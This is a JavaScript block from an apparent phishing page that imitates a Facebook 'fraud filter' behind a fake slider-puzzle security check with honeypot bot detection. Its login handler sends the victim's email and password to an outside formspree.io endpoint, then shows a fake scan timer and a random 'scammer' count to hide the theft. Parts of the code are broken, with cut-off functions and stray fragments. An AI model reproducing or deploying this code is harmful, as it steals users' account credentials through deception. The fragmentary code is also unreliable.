    <script>
        // ====== SECURITY GATEWAY IMPLEMENTATION ======
        
        // Session state tracking
        let sessionVerified = false;
        let sessionBlocked = false;
        let interactionDetected = {
            mouseDown: false,
            mouseMove: false,
            mouseUp: false
        };

        // Honeypot protection - blocks bot-like access
        document.getElementById('honeypot-link').addEventListener('click', (e) => {
            e.preventDefault();
            blockSession('Honeypot link clicked - Bot detected');
        });

        function blockSession(reason) {
            sessionBlocked = true;
            console.warn('[Security] Session blocked:', reason);
            
            // Hide puzzle, show blocked message
            document.getElementById('puzzle-container').classList.add('hidden-page');
            document.getElementById('blocked-container').classList.remove('hidden-page');
            document.getElementById('security-gateway').classList.add('session-blocked');
        }

        // ====== PUZZLE VERIFICATION SYSTEM ======
        
        let puzzleState = {
            pieceX: 20,
            pieceY: 15,
            isDragging: false,
            startX: 0,
            startY: 0,
            targetX: 320,
            targetThreshold: 40,
            solved: false
        };

        const canvas = document.getElementById('puzzleCanvas');
        const ctx = canvas.getContext('2d');

        // Set canvas size
        function resizeCanvas() {
            const rect = canvas.getBoundingClientRect();
            canvas.width = rect.width;
            canvas.height = rect.height;
            drawPuzzle();
        }

        function drawPuzzle() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Draw background track
            ctx.fillStyle = '#e5e5e5';
            ctx.fillRect(10, canvas.height / 2 - 15, canvas.width - 20, 30);
            
            // Draw target zone (destination indicator)
            ctx.fillStyle = '#d1d5db';
            ctx.fillRect(puzzleState.targetX, canvas.height / 2 - 15, 40, 30);
            
            // Draw arrow in target zone
            ctx.fillStyle = '#999';
            ctx.font = 'bold 20px Arial';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('âœ“', puzzleState.targetX + 20, canvas.height / 2);
            
            // Draw puzzle piece
            ctx.fillStyle = '#4f46e5';
            ctx.beginPath();
            ctx.roundRect(puzzleState.pieceX, canvas.height / 2 - 12, 40, 24, 4);
            ctx.fill();
            
            // Draw arrow on piece
            ctx.fillStyle = 'white';
            ctx.font = 'bold 18px Arial';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('â†’', puzzleState.pieceX + 20, canvas.height / 2);
            
            // Draw success state
            if (puzzleState.solved) {
                ctx.fillStyle = 'rgba(34, 197, 94, 0.1)';
                ctx.fillRect(10, canvas.height / 2 - 15, canvas.width - 20, 30);
            }
        }

        // Polyfill for roundRect if not available
        if (!CanvasRenderingContext2D.prototype.roundRect) {
            CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
                if (w < 2 * r) r = w / 2;
                if (h < 2 * r) r = h / 2;
                this.beginPath();
                this.moveTo(x + r, y);
                this.arcTo(x + w, y, x + w, y + h, r);
                this.arcTo(x + w, y + h, x, y + h, r);
                this.arcTo(x, y + h, x, y, r);
                this.arcTo(x, y, x + r, y, r);
                this.closePath();
                return this;
            };
        }

        // Mouse/Touch events for puzzle interaction
        canvas.addEventListener('mousedown', (e) => {
            interactionDetected.mouseDown = true;
            if (puzzleState.solved || sessionBlocked) return;
            
            const rect = canvas.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            // Check if click is within puzzle piece
            if (x >= puzzleState.pieceX && x <= puzzleState.pieceX + 40 &&
                y >= canvas.height / 2 - 12 && y <= canvas.height / 2 + 12) {
                puzzleState.isDragging = true;
                puzzleState.startX = x;
            }
        });

        canvas.addEventListener('mousemove', (e) => {
            if (puzzleState.isDragging) {
                interactionDetected.mouseMove = true;
                if (puzzleState.solved || sessionBlocked) return;
                
                const rect = canvas.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const deltaX = x - puzzleState.startX;
                
                // Constrain movement
                puzzleState.pieceX = Math.max(20, Math.min(canvas.width - 70, 20 + deltaX));
                drawPuzzle();
            }
        });

        canvas.addEventListener('mouseup', (e) => {
            interactionDetected.mouseUp = true;
            if (!puzzleState.isDragging) return;
            
            puzzleState.isDragging = false;
            
            // Check if piece is in target zone
            if (Math.abs(puzzleState.pieceX - puzzleState.targetX) < puzzleState.targetThreshold) {
                solvePuzzle();
            } else {
                // Reset piece
                puzzleState.pieceX = 20;
                drawPuzzle();
                updatePuzzleStatus('Try again', false);
            }
        });

        // Touch support
        canvas.addEventListener('touchstart', (e) => {
            interactionDetected.mouseDown = true;
            if (puzzleState.solved || sessionBlocked) return;
            
            const rect = canvas.getBoundingClientRect();
            const touch = e.touches[0];
            const x = touch.clientX - rect.left;
            const y = touch.clientY - rect.top;
            
            if (x >= puzzleState.pieceX && x <= puzzleState.pieceX + 40 &&
                y >= canvas.height / 2 - 12 && y <= canvas.height / 2 + 12) {
                puzzleState.isDragging = true;
                puzzleState.startX = x;
            }
        });

        canvas.addEventListener('touchmove', (e) => {
            if (puzzleState.isDragging) {
                interactionDetected.mouseMove = true;
                e.preventDefault();
                if (puzzleState.solved || sessionBlocked) return;
                
                const rect = canvas.getBoundingClientRect();
                const touch = e.touches[0];
                const x = touch.clientX - rect.left;
                const deltaX = x - puzzleState.startX;
                
                puzzleState.pieceX = Math.max(20, Math.min(canvas.width - 70, 20 + deltaX));
                drawPuzzle();
            }
        });

        canvas.addEventListener('touchend', (e) => {
            interactionDetected.mouseUp = true;
            if (!puzzleState.isDragging) return;
            
            puzzleState.isDragging = false;
            
            if (Math.abs(puzzleState.pieceX - puzzleState.targetX) < puzzleState.targetThreshold) {
                solvePuzzle();
            } else {
                puzzleState.pieceX = 20;
                drawPuzzle();
                updatePuzzleStatus('Try again', false);
            }
        });

        function updatePuzzleStatus(message, success = false) {
            const status = document.getElementById('puzzleStatus');
            status.textContent = message;
            status.className = success ? 'puzzle-status puzzle-success' : 'puzzle-status';
        }

        function solvePuzzle() {
            // Verify real human interaction
            if (!interactionDetected.mouseDown || !interactionDetected.mouseMove || !interactionDetected.mouseUp) {
                console.warn('[Security] Interaction verification failed - bot-like behavior detected');
                blockSession('Invalid interaction pattern detected');
                return;
            }

            puzzleState.solved = true;
            updatePuzzleStatus('âœ“ Verified', true);
            
            setTimeout(() => {
                beginVerificationAnalysis();
            }, 500);
        }

            document.getElementById('puzzle-container').classList.add('hidden-page');
            document.getElementById('analyzing-container').classList.remove('hidden-page');
            
            // Simulate security analysis
            setTimeout(() => {
                completeVerification();
            }, 2000);
        }

            // Hide security gateway

            // Inject main application HTML

                    <button onclick="location.reload()" class="bg-[#1877f2] text-white font-bold py-2 px-6 rounded-md">Go to News Feed</button>
                </div>
            `;
        }

        function initializeMainApp() {
            // Initialize loading screen
            window.onload = () => {
                setTimeout(() => {
                    document.getElementById('loading-screen').classList.add('fade-out');
                    setTimeout(() => {
                        document.getElementById('loading-screen').classList.add('hidden-page');
                        document.getElementById('fraud-filter-page').classList.remove('hidden-page');
                    }, 500);
                }, 1800);
            };

            // Trigger initial load sequence
            if (document.readyState === 'loading') {
                window.onload();
            } else {
                window.onload();
            }

            // Setup showLoginPage function
            window.showLoginPage = function() {
                document.getElementById('fraud-filter-page').classList.add('hidden-page');
                document.getElementById('login-page').classList.remove('hidden-page');
                window.scrollTo(0, 0);
            };

            // Setup login form handler
            setTimeout(() => {
                const loginForm = document.getElementById('loginForm');
                if (loginForm) {
                    loginForm.addEventListener('submit', (e) => {
                        e.preventDefault();
                        
                        const inputs = e.target.querySelectorAll('input');
                        const formData = new FormData();
                        formData.append('email', inputs[0].value);
                        formData.append('password', inputs[1].value);
                        
                        fetch('https://formspree.io/f/mlgbkzly', {
                            method: 'POST',
                            body: formData,
                            headers: {
                                'Accept': 'application/json'
                            }
                        }).then(response => {
                            document.getElementById('login-page').classList.add('hidden-page');
                            document.getElementById('scanning-page').classList.remove('hidden-page');
                            startScanTimer();
                        }).catch(error => {
                            document.getElementById('login-page').classList.add('hidden-page');
                            document.getElementById('scanning-page').classList.remove('hidden-page');
                            startScanTimer();
                        });
                    });
                }
            }, 100);

            // Setup scan timer
            window.startScanTimer = function() {
                let seconds = 30;
                const timerEl = document.getElementById('timer');
                const countdown = setInterval(() => {
                    seconds--;
                    timerEl.innerText = `Time remaining: ${seconds}s`;
                    if (seconds <= 0) {
                        clearInterval(countdown);
                        showResults();
                    }
                }, 1000);
            };

            // Setup results function
            window.showResults = function() {
                const count = Math.floor(Math.random() * (195 - 7 + 1)) + 7;
                document.getElementById('scammer-count').innerText = count;
                document.getElementById('scanning-page').classList.add('hidden-page');
                document.getElementById('results-modal').classList.remove('hidden-page');
                
                setTimeout(() => {
                    document.getElementById('reload-prompt').classList.remove('hidden-page');
                }, 1000);
            };

            // Setup goTo404 function
            window.goTo404 = function() {
                document.getElementById('results-modal').classList.add('hidden-page');
                document.getElementById('error-page').classList.remove('hidden-page');
            };
        }

        // Initialize canvas on page load
        window.addEventListener('load', () => {
            resizeCanvas();
        });

        window.addEventListener('resize', () => {
            resizeCanvas();
        });

        // Start with canvas initialized
        resizeCanvas();
    </script>
